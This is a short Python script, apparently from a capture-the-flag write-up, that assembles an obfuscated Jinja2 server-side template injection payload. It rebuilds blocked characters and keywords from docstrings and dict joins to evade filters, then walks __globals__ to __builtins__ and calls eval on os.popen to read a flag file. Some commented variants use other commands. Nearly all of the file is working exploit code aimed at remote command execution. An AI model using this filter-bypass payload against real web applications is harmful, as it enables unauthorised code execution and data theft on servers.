# Author：颖奇L'Amore
# source: https://tr0jan.top/archives/43/

# _
payload = '{% set xhx = (({ }|select()|string()|list()).pop(24)|string()) %}'
payload = payload + \
    '{% set spa = ((app.__doc__|list()).pop(102)|string()) %}'  # space
payload = payload + \
    '{% set pt = ((app.__doc__|list()).pop(320)|string()) %}'  # dot
payload = payload + \
    '{% set yin = ((app.__doc__|list()).pop(337)|string()) %}'  # single quote
payload = payload + \
    '{% set left = ((app.__doc__|list()).pop(264)|string()) %}'  # Bracket (
payload = payload + \
    '{% set right = ((app.__doc__|list()).pop(286)|string()) %}'  # Bracket )
payload = payload + \
    '{% set slas = (y1ng.__init__.__globals__.__repr__()|list()).pop(349) %}'  # slash /
payload = payload+'{% set bu = dict(buil=aa,tins=dd)|join() %}'  # builtins
payload = payload+'{% set im = dict(imp=aa,ort=dd)|join() %}'  # import
payload = payload+'{% set sy = dict(po=aa,pen=dd)|join() %}'  # popen
payload = payload+'{% set os = dict(o=aa,s=dd)|join() %}'  # os
payload = payload+'{% set ca = dict(ca=aa,t=dd)|join() %}'  # cat
payload = payload+'{% set ls = dict(l=aa,s=dd)|join() %}'  # ls
payload = payload+'{% set tmp = dict(tm=aa,p=dd)|join() %}'  # tmp
payload = payload+'{% set st = dict(ss=aa,ti=dd)|join() %}'  # ssti
payload = payload+'{% set hom = dict(ho=aa,me=dd)|join() %}'  # home
payload = payload+'{% set usr = dict(u=aa,sr=dd)|join() %}'  # usr
payload = payload+'{% set ctf = dict(c=aa,tf=dd)|join() %}'  # ctf
payload = payload + \
    '{% set flg = dict(duma_doa=aa,ncc_flag=dd)|join() %}'  # flag
payload = payload+'{% set f = dict(f=aa)|join() %}'  # f
payload = payload+'{% set txt = dict(tx=aa,t=dd)|join() %}'  # txt
payload = payload+'{% set ev = dict(ev=aa,al=dd)|join() %}'  # eval
payload = payload+'{% set red = dict(re=aa,ad=dd)|join() %}'  # read
payload = payload+'{% set bul = xhx*2~bu~xhx*2 %}'  # __builtins__
# SSTI: __import__('os').popen('cat /flag').read()
# payload = payload + \
#     '{% set pld = xhx*2~im~xhx*2~left~yin~os~yin~right~pt~sy~left~yin~ca~spa~flg~pt~txt~yin~right~pt~red~left~right %}'
# SSTI: __import__('os').popen('ls -la /').read()
payload = payload + \
    '{% set pld = xhx*2~im~xhx*2~left~yin~os~yin~right~pt~sy~left~yin~ca~spa~slas~hom~slas~ctf~slas~flg~pt~txt~yin~right~pt~red~left~right %}'
print(payload)
print()
payload = payload + \
    '{% for f,v in y1ng.__init__.__globals__.items() %}'  # globals
payload = payload + '{% if f == bul %}'
payload = payload + '{% for a,b in v.items() %}'  # builtins
payload = payload + '{% if a == ev %}'  # eval
payload = payload + '{{b(pld)}}'  # eval(pld)
payload = payload + '{% endif %}'
payload = payload + '{% endfor %}'
payload = payload + '{% endif %}'
payload = payload + '{% endfor %}'
print(payload)
